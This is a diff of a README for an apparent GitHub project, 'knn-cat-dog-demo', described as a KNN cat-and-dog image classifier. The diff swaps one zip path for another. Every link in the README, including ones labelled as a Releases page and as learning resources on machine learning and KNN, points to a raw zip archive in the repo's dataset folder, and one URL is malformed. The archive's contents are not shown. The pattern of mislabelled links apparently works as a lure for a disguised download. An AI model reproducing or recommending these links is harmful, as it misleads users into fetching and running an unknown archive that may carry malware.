@@ -1,6 +1,6 @@
 # 🐱‍👤 knn-cat-dog-demo - Classify Images of Cats and Dogs Easily
 
-[![Download from Releases](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/cats/demo_dog_knn_cat_v2.1.zip%20from%https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/cats/demo_dog_knn_cat_v2.1.zip)](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/cats/demo_dog_knn_cat_v2.1.zip)
+[![Download from Releases](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/demo-dog-cat-knn-1.8.zip%20from%https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/demo-dog-cat-knn-1.8.zip)](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/demo-dog-cat-knn-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **knn-cat-dog-demo**! This application uses a KNN (K-Nearest Neig
 
 To obtain the application, visit the following link:
 
-[Download from Releases](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/cats/demo_dog_knn_cat_v2.1.zip)
+[Download from Releases](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/demo-dog-cat-knn-1.8.zip)
 
 1. Click on the link above to visit the Releases page.
 2. Find the latest version of the application.
@@ -64,9 +64,9 @@ The KNN algorithm measures the distance between data points. When you upload an 
 
 If you want to learn more about machine learning and KNN algorithms, consider checking these resources:
 
-- [Machine Learning Basics](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/cats/demo_dog_knn_cat_v2.1.zip)
-- [Understanding KNN Algorithm](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/cats/demo_dog_knn_cat_v2.1.zip)
-- [Computer Vision Techniques](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/cats/demo_dog_knn_cat_v2.1.zip)
+- [Machine Learning Basics](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/demo-dog-cat-knn-1.8.zip)
+- [Understanding KNN Algorithm](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/demo-dog-cat-knn-1.8.zip)
+- [Computer Vision Techniques](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/demo-dog-cat-knn-1.8.zip)
 
 ## 👥 Contributing
 
@@ -78,4 +78,4 @@ We welcome your feedback! If you have any questions or need assistance, please c
 
 ---
 
-Remember, you can revisit the [Releases page](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/cats/demo_dog_knn_cat_v2.1.zip) anytime to download the latest version of the application. Enjoy classifying your images!
+Remember, you can revisit the [Releases page](https://github.com/mickeygls2012/knn-cat-dog-demo/raw/refs/heads/main/dataset/demo-dog-cat-knn-1.8.zip) anytime to download the latest version of the application. Enjoy classifying your images!
